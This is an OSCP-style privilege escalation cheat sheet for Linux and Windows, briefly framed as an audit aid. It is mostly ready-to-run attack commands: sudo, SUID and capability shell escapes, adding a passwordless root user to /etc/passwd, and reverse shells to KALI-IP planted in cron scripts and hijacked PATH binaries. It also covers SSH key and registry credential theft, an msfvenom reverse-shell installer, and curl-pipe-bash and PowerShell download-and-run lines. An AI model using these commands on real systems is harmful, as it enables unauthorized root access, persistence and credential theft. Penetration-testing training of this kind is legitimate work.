# Privilege Escalation Audit Cheatsheet

Privilege escalation is a cyberattack technique where an attacker gains unauthorized elevated access or permissions beyond their initial level. It allows attackers to move from limited access to full control of systems, making it a critical focus for security audits and defenses. This cheatsheet provides commands and checks for auditing privilege escalation risks on Windows and Linux.

---

# Privilege Escalation Ultimate Cheat Sheet
# OSCP-Focused | Linux + Windows

---

## ══ LINUX PRIVILEGE ESCALATION ══

## STEP 1: Who Am I?
id
whoami
hostname
uname -a          # kernel version → check for kernel exploits
cat /etc/os-release
cat /etc/issue

## STEP 2: What Can I Do?
sudo -l           # MOST IMPORTANT CHECK — what can I run as root?
cat /etc/sudoers  # if readable

### SUDO Exploits (from sudo -l output)
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!bash'

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# (ALL) NOPASSWD: /usr/bin/nmap (old versions)
sudo nmap --interactive
nmap> !bash

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/bash

# (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (ALL) NOPASSWD: /usr/bin/nano
sudo nano
^R^X  (Ctrl+R, Ctrl+X)
reset; sh 1>&0 2>&0

# Check GTFOBins for any binary: https://gtfobins.github.io/

## STEP 3: SUID Binaries
find / -perm -4000 -type f 2>/dev/null

### Common SUID Exploits
# /usr/bin/find
find / -exec /bin/bash -p \;

# /usr/bin/vim
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# /usr/bin/bash (SUID set)
bash -p

# /usr/bin/cp
# Copy /etc/passwd with modified root entry
cp /etc/passwd /tmp/passwd.bak
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

## STEP 4: Cron Jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron*
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Find writable scripts called by cron
find / -type f -name "*.sh" 2>/dev/null | xargs ls -la
# If cron runs /opt/backup.sh as root and you can write:
echo 'bash -i >& /dev/tcp/KALI-IP/4444 0>&1' >> /opt/backup.sh

## STEP 5: Writable Files / Paths
# World-writable directories
find / -writable -type d 2>/dev/null

# PATH hijacking — if root script calls binary without full path:
echo 'bash -i >& /dev/tcp/KALI-IP/4444 0>&1' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Now when root runs 'ls', it runs your payload

## STEP 6: Services & Running Processes
ps aux
ps aux | grep root     # processes running as root
netstat -lpnt          # services listening on localhost

## STEP 7: Credentials Hunting
cat ~/.bash_history
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "*.txt" 2>/dev/null | xargs grep -i "password" 2>/dev/null
cat /var/www/html/config*
cat /home/*/.ssh/id_rsa      # steal SSH keys

## STEP 8: Writable /etc/passwd
# Generate password hash:
openssl passwd -1 -salt hack hack123
# Add user:
echo 'hacker:$1$hack$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   (password: hack123)

## STEP 9: Capabilities
getcap -r / 2>/dev/null
# python3.9 cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# perl cap_setuid:
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'

## STEP 10: NFS Shares (no_root_squash)
cat /etc/exports
# If no_root_squash:
showmount -e TARGET
mount -o rw TARGET:/share /mnt/nfs
# On Kali as root:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target:
/tmp/nfs/bash -p   → root!

## AUTOMATED TOOLS
# LinPEAS (most comprehensive)
curl http://KALI-IP/linpeas.sh | bash
# Or: wget http://KALI-IP/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh

# Linux Smart Enumeration
wget http://KALI-IP/lse.sh; chmod +x lse.sh; ./lse.sh -l1

---

## ══ WINDOWS PRIVILEGE ESCALATION ══

## STEP 1: Who Am I?
whoami /all           # user + privileges + groups
whoami /priv          # focus on privileges

### Dangerous Privileges
# SeImpersonatePrivilege → RottenPotato / JuicyPotato / PrintSpoofer
whoami /priv | findstr "Impersonate"
# Run: PrintSpoofer64.exe -i -c cmd
# Run: JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# SeBackupPrivilege → dump SAM
# SeDebugPrivilege → Mimikatz

## STEP 2: System Info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list        # patches installed
wmic os get osarchitecture

## STEP 3: Services
# Find services with weak binary permissions:
Get-WmiObject win32_service | Select Name,State,PathName,StartName
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /iv "C:\Windows"

# Check permissions on service binary:
icacls "C:\path\to\service.exe"
# If Everyone:(F) or BUILTIN\Users:(W) → replace binary!

# Unquoted service paths:
wmic service get name,pathname | findstr /i "auto" | findstr /iv "\"" | findstr /iv "C:\Windows"

## STEP 4: Registry Credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # AutoLogon
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"

## STEP 5: Credential Files
type "C:\Users\Public\Desktop\*.txt"
type "C:\Windows\Panther\unattend.xml"
type "C:\Windows\Panther\Unattended.xml"
type "C:\Windows\system32\sysprep.inf"
type "C:\inetpub\wwwroot\web.config"
dir /s /b C:\ | findstr /si "pass*.txt pass*.xml pass*.ini cred*"

## STEP 6: Scheduled Tasks
schtasks /query /fo LIST /v | findstr /i "task\|run\|status\|user"
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM"}

## STEP 7: AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

## STEP 8: PowerShell History
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

## AUTOMATED TOOLS
# winPEAS:
certutil -urlcache -f http://KALI-IP/winPEASx64.exe C:\Temp\wp.exe
C:\Temp\wp.exe

# PowerUp:
powershell -ep bypass -c "IEX(iwr http://KALI-IP/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks"
